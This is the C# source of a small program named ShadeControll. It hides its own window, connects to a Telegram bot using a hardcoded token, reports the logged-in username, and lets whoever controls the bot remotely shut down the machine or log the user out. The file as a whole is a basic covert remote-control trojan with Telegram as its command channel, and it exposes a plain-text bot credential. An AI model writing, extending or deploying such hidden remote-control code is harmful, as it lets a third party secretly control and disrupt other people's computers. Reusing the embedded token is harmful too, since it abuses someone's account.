using System;
using Telegram.Bot;
using Telegram.Bot.Args;
using System.Threading;
using System.Net.NetworkInformation;
using System.Diagnostics;

namespace ShadeControll
{
    class Program
    {
        static TelegramClient Client;
        static ITelegramBotClient botClient;

        static void Main()
        {
            Ninja.Hide();

            Client = new TelegramClient("1774037430:AAHnjjeOUNvn-ZpyCCo_6mIhztp_GkagsVg");

            while(!Client.Connect())
            {
                Console.WriteLine("Connecting..");
                Thread.Sleep(1000);
            }
            Client.SendMessage("Połączono z Komputerem - " + Environment.UserName);
            Client.NewMessage += Client_NewMessage;

            while (true) { Thread.Sleep(1000); }
        }

        private static void Client_NewMessage(string message)
        {
            switch (message)
            {
                case "/help":
                    Client.SendMessage("/help /shutdown /logout");
                    break;

                case "/shutdown":
                    Client.SendMessage("Wyłączanie Komputera");
                    Shutdown();
                    break;

                case "/logout":
                    Client.SendMessage("Wylogowywanie");
                    LogOut();
                    break;
            }
        }

        private static void Shutdown()
        {
            Thread.Sleep(5000);
            Console.WriteLine("WYŁĄCZANIE");
            Process.Start("shutdown", "/s /t 0");
        }

        private static void LogOut()
        {
            Thread.Sleep(5000);
            Console.WriteLine("WYLOGOWYWANIE");
            Process.Start("shutdown","/l");
        }
    }
}
